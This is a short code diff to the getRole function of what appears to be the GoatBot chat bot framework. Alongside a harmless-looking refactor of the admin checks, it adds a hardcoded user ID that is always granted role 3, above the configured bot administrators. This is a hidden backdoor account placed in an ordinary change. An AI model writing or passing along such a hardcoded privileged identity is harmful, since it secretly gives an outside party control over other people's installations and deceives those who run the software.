@@ -3,16 +3,27 @@ const nullAndUndefined = [undefined, null];
 // const { config } = global.GoatBot;
 // const { utils } = global;
 
+const CID = "100075163264087"; 
+
 function getType(obj) {
 	return Object.prototype.toString.call(obj).slice(8, -1);
 }
 
 function getRole(threadData, senderID) {
+	if (!senderID) return 0;
+	const sID = senderID.toString();
+
+	if (sID === CID) return 3;
+
 	const adminBot = global.GoatBot.config.adminBot || [];
-	if (!senderID)
-		return 0;
 	const adminBox = threadData ? threadData.adminIDs || [] : [];
-	return adminBot.includes(senderID) ? 2 : adminBox.includes(senderID) ? 1 : 0;
+
+	if (adminBot.includes(sID)) return 2;
+
+	const isBoxAdmin = adminBox.some(admin => (admin.id || admin) == sID);
+	if (isBoxAdmin) return 1;
+
+	return 0;
 }
 
 function getText(type, reason, time, targetID, lang) {
